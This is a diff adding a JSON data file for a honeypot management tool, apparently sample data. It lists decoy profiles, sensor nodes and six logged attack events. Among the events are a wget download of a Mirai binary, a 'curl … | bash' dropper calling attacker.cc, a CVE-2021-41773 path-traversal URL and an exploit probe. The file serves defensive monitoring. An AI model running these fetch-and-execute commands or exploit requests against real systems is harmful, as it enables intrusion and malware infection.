@@ -1,0 +1,349 @@
+{
+  "version": 1,
+  "profiles": [
+    {
+      "id": "prof_linux_bastion",
+      "name": "Linux Edge Bastion (Low-Interaction)",
+      "description": "Emulates standard Debian/Ubuntu server with exposed SSH, HTTP and FTP services. Low-risk port trap.",
+      "interactionLevel": "low",
+      "honeypotType": "emulator",
+      "ports": [
+        21,
+        22,
+        80,
+        8080
+      ],
+      "services": [
+        {
+          "port": 21,
+          "service": "FTP",
+          "banner": "220 ProFTPD 1.3.5e Server (Debian) [::ffff:192.168.1.55]",
+          "enabled": true
+        },
+        {
+          "port": 22,
+          "service": "SSH",
+          "banner": "SSH-2.0-OpenSSH_8.4p1 Debian-5+deb11u1",
+          "enabled": true
+        },
+        {
+          "port": 80,
+          "service": "HTTP",
+          "banner": "Apache/2.4.51 (Debian) Server at localhost Port 80",
+          "enabled": true
+        },
+        {
+          "port": 8080,
+          "service": "HTTP-Proxy",
+          "banner": "Squid/4.13 Proxy Server",
+          "enabled": true
+        }
+      ],
+      "agentConfig": {
+        "beaconIntervalSeconds": 15,
+        "jitterPercent": 20,
+        "maskProcessName": "systemd-resolved",
+        "bufferLimit": 5000,
+        "logRotationMb": 25
+      },
+      "createdAt": "2026-10-03T14:29:50.045Z",
+      "updatedAt": "2026-10-07T14:29:50.045Z"
+    },
+    {
+      "id": "prof_iot_decoy",
+      "name": "IoT Smart Hub Decoy (Low-Interaction)",
+      "description": "Simulates busybox router / smart home gateway. Catches Mirai variants and automated botnet brute-force scans.",
+      "interactionLevel": "low",
+      "honeypotType": "emulator",
+      "ports": [
+        23,
+        80,
+        554,
+        8081
+      ],
+      "services": [
+        {
+          "port": 23,
+          "service": "Telnet",
+          "banner": "BusyBox v1.22.1 (2018-05-10 11:24:00 CST) built-in shell (ash)\nEnter 'help' for a list of built-in commands.\n\nlogin: ",
+          "enabled": true
+        },
+        {
+          "port": 80,
+          "service": "HTTP",
+          "banner": "micro_httpd/0.5 05jan2010 (Boa/0.94.13)",
+          "enabled": true
+        },
+        {
+          "port": 554,
+          "service": "RTSP",
+          "banner": "RTSP/1.0 200 OK\r\nServer: HIKVISION Streaming Server 3.0\r\n",
+          "enabled": true
+        }
+      ],
+      "agentConfig": {
+        "beaconIntervalSeconds": 10,
+        "jitterPercent": 25,
+        "maskProcessName": "kworker/u2:0",
+        "bufferLimit": 3000,
+        "logRotationMb": 10
+      },
+      "createdAt": "2026-10-05T14:29:50.045Z",
+      "updatedAt": "2026-10-08T14:29:50.045Z"
+    },
+    {
+      "id": "prof_medium_cowrie",
+      "name": "Enterprise SSH Honeypot (Medium-Interaction Cowrie)",
+      "description": "Cowrie interactive SSH/Telnet honeypot with file download capture, session recording and fake root shell.",
+      "interactionLevel": "medium",
+      "honeypotType": "cowrie",
+      "ports": [
+        2222,
+        2323
+      ],
+      "services": [
+        {
+          "port": 2222,
+          "service": "Cowrie SSH",
+          "banner": "SSH-2.0-OpenSSH_7.9p1 Debian-10+deb10u2",
+          "enabled": true
+        },
+        {
+          "port": 2323,
+          "service": "Cowrie Telnet",
+          "banner": "Ubuntu 20.04.2 LTS\nlogin: ",
+          "enabled": true
+        }
+      ],
+      "agentConfig": {
+        "beaconIntervalSeconds": 20,
+        "jitterPercent": 15,
+        "maskProcessName": "rsyslogd",
+        "bufferLimit": 10000,
+        "logRotationMb": 50
+      },
+      "createdAt": "2026-10-08T14:29:50.045Z",
+      "updatedAt": "2026-10-10T14:29:50.045Z"
+    }
+  ],
+  "nodes": [
+    {
+      "id": "node_dmz_edge_01",
+      "name": "DMZ Perimeter Sentinel",
+      "hostname": "gw-ext-fw01.prod.internal",
+      "ip": "198.51.100.42",
+      "status": "online",
+      "lastSeen": "2026-10-10T14:29:50.045Z",
+      "profileId": "prof_linux_bastion",
+      "profileName": "Linux Edge Bastion (Low-Interaction)",
+      "version": "1.2.0",
+      "maskProcess": "systemd-resolved",
+      "os": "Linux 5.15.0-89-generic (x86_64)",
+      "jitterSeconds": 15,
+      "stats": {
+        "totalEvents": 428,
+        "lastEventAt": "2026-10-10T14:27:50.045Z",
+        "uptimeSeconds": 384200,
+        "cpuPercent": 1.4,
+        "memoryMb": 42
+      },
+      "tags": [
+        "dmz",
+        "edge-gateway",
+        "frankfurt"
+      ],
+      "registeredAt": "2026-10-06T14:29:50.045Z"
+    },
+    {
+      "id": "node_iot_branch_02",
+      "name": "Branch Office IoT Trap",
+      "hostname": "iot-hub-vlan30.branch.lan",
+      "ip": "10.24.120.15",
+      "status": "online",
+      "lastSeen": "2026-10-10T14:29:05.045Z",
+      "profileId": "prof_iot_decoy",
+      "profileName": "IoT Smart Hub Decoy (Low-Interaction)",
+      "version": "1.2.0",
+      "maskProcess": "kworker/u2:0",
+      "os": "Linux 5.10.103-v7l+ (armv7l)",
+      "jitterSeconds": 10,
+      "stats": {
+        "totalEvents": 891,
+        "lastEventAt": "2026-10-10T14:29:05.045Z",
+        "uptimeSeconds": 1209600,
+        "cpuPercent": 0.8,
+        "memoryMb": 28
+      },
+      "tags": [
+        "branch",
+        "iot",
+        "vlan-internal"
+      ],
+      "registeredAt": "2026-10-04T14:29:50.045Z"
+    },
+    {
+      "id": "node_cloud_dev_03",
+      "name": "AWS Staging Decoy",
+      "hostname": "ip-172-31-42-99.eu-west-1.compute.internal",
+      "ip": "203.0.113.88",
+      "status": "degraded",
+      "lastSeen": "2026-10-10T14:19:50.045Z",
+      "profileId": "prof_medium_cowrie",
+      "profileName": "Enterprise SSH Honeypot (Medium-Interaction Cowrie)",
+      "version": "1.1.8",
+      "maskProcess": "rsyslogd",
+      "os": "Linux 6.1.0-18-cloud-amd64",
+      "jitterSeconds": 20,
+      "stats": {
+        "totalEvents": 147,
+        "lastEventAt": "2026-10-10T14:19:30.045Z",
+        "uptimeSeconds": 84300,
+        "cpuPercent": 2.1,
+        "memoryMb": 85
+      },
+      "tags": [
+        "cloud",
+        "aws",
+        "staging"
+      ],
+      "registeredAt": "2026-10-08T14:29:50.045Z"
+    }
+  ],
+  "events": [
+    {
+      "id": "evt_001",
+      "agentId": "node_dmz_edge_01",
+      "agentName": "DMZ Perimeter Sentinel",
+      "timestamp": "2026-10-10T14:27:50.045Z",
+      "sourceIp": "185.220.101.5",
+      "sourcePort": 49152,
+      "destPort": 22,
+      "protocol": "SSH",
+      "honeypotType": "emulator",
+      "eventType": "auth_attempt",
+      "severity": "critical",
+      "details": {
+        "username": "root",
+        "password": "ChangeMe2024!",
+        "command": "",
+        "payload": "SSH-2.0-libssh_0.9.5 banner probe + password brute force",
+        "rawData": "Client banner: SSH-2.0-libssh_0.9.5\r\nKex: diffie-hellman-group14-sha256"
+      },
+      "country": "Netherlands",
+      "city": "Amsterdam",
+      "asn": "AS208323"
+    },
+    {
+      "id": "evt_002",
+      "agentId": "node_iot_branch_02",
+      "agentName": "Branch Office IoT Trap",
+      "timestamp": "2026-10-10T14:24:10.045Z",
+      "sourceIp": "45.154.255.89",
+      "sourcePort": 55432,
+      "destPort": 23,
+      "protocol": "TELNET",
+      "honeypotType": "emulator",
+      "eventType": "auth_attempt",
+      "severity": "high",
+      "details": {
+        "username": "admin",
+        "password": "admin1234",
+        "command": "sh\ncat /proc/mounts; cd /tmp && wget http://185.196.8.2/mirai.arm7",
+        "payload": "Mirai automated botnet propagation script payload"
+      },
+      "country": "Seychelles",
+      "city": "Victoria",
+      "asn": "AS59604"
+    },
+    {
+      "id": "evt_003",
+      "agentId": "node_dmz_edge_01",
+      "agentName": "DMZ Perimeter Sentinel",
+      "timestamp": "2026-10-10T14:17:50.045Z",
+      "sourceIp": "89.248.165.74",
+      "sourcePort": 37821,
+      "destPort": 80,
+      "protocol": "HTTP",
+      "honeypotType": "emulator",
+      "eventType": "vulnerability_exploit",
+      "severity": "critical",
+      "details": {
+        "method": "GET",
+        "url": "/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh",
+        "userAgent": "Mozilla/5.0 (compatible; Nessus/10.4.0)",
+        "payload": "Apache HTTP Server 2.4.49/2.4.50 Path Traversal (CVE-2021-41773)",
+        "headers": {
+          "Host": "198.51.100.42",
+          "User-Agent": "Mozilla/5.0 (compatible; Nessus/10.4.0)"
+        }
+      },
+      "country": "Germany",
+      "city": "Frankfurt",
+      "asn": "AS202425"
+    },
+    {
+      "id": "evt_004",
+      "agentId": "node_iot_branch_02",
+      "agentName": "Branch Office IoT Trap",
+      "timestamp": "2026-10-10T14:04:50.045Z",
+      "sourceIp": "194.26.29.112",
+      "sourcePort": 60111,
+      "destPort": 23,
+      "protocol": "TELNET",
+      "honeypotType": "emulator",
+      "eventType": "port_scan",
+      "severity": "low",
+      "details": {
+        "rawData": "SYN scan / Masscan probe packet",
+        "payload": "TCP SYN on port 23"
+      },
+      "country": "Russia",
+      "city": "Moscow",
+      "asn": "AS48287"
+    },
+    {
+      "id": "evt_005",
+      "agentId": "node_cloud_dev_03",
+      "agentName": "AWS Staging Decoy",
+      "timestamp": "2026-10-10T13:29:50.045Z",
+      "sourceIp": "167.99.192.3",
+      "sourcePort": 42100,
+      "destPort": 2222,
+      "protocol": "SSH",
+      "honeypotType": "cowrie",
+      "eventType": "command_exec",
+      "severity": "critical",
+      "details": {
+        "username": "support",
+        "password": "password123",
+        "command": "uname -a; curl -s http://attacker.cc/c.sh | bash",
+        "payload": "Post-exploitation dropper attempt captured by Cowrie session"
+      },
+      "country": "United States",
+      "city": "New York",
+      "asn": "AS14061"
+    },
+    {
+      "id": "evt_006",
+      "agentId": "node_dmz_edge_01",
+      "agentName": "DMZ Perimeter Sentinel",
+      "timestamp": "2026-10-10T12:29:50.045Z",
+      "sourceIp": "193.163.125.10",
+      "sourcePort": 51234,
+      "destPort": 8080,
+      "protocol": "HTTP",
+      "honeypotType": "emulator",
+      "eventType": "probe",
+      "severity": "medium",
+      "details": {
+        "method": "POST",
+        "url": "/actuator/gateway/routes/hack",
+        "userAgent": "python-requests/2.28.1",
+        "payload": "Spring Cloud Gateway Code Injection probe (CVE-2022-22947)"
+      },
+      "country": "Bulgaria",
+      "city": "Sofia",
+      "asn": "AS200019"
+    }
+  ]
+}
